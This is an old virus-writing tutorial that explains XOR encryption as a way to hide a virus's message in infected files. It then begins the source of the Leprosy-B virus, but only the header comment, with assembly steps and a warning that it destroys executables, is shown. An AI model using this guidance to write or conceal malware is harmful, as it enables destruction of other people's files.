                     - SIMPLE ENCRYPTION METHODS -


    Encryption is perhaps one of the key parts of writing a virus.  If you
have a virus that prints a message to the screen, you don't want infected
files to contain that message.

    One easy way to encrypt data is the XOR method.  XOR is a matamatical
function that can be used to cifer and decifer data with the same key.

Example --

              FF  xor  A1  =  5E
byte to encrypt^       ^key   ^result

and likewise

              5E  xor  A1  =  FF

So as you can see an easy way to encrypt/decrypt sensitve data is with the
XOR function.

A popular virus that demonstrates this teqnique is Leprosy-B.  By studing the
below example you are on the way to make simple encrypted viruses.

;                       Copy-ya-right (c) 1990 by PCM2.
;
;  This file is the source code to the Leprosy-B virus.  It should
;  be assembled with an MASM-compatible assembler; it has been tested
;  and assembles correctly with both MASM 4.0 and Turbo Assembler 1.0.
;  It should be made into a .COM file before executing, with either
;  the "/t" command line flag in TLINK or Microsoft's EXE2BIN utility.
;
;  This program has the potential to permanently destroy executable
;  images on any disk medium.  Other modifications may have been made
;  subsequent to the original release by the author, either benign,
;  or which could result in further harm should this program be run.
;  In any case, the author assumes no responsibility for any damage
;  caused by this program, incidental or otherwise.  As a precaution,
;  this program should not be turned over to irresponsible hands...
;  (unlike people like us, that is).
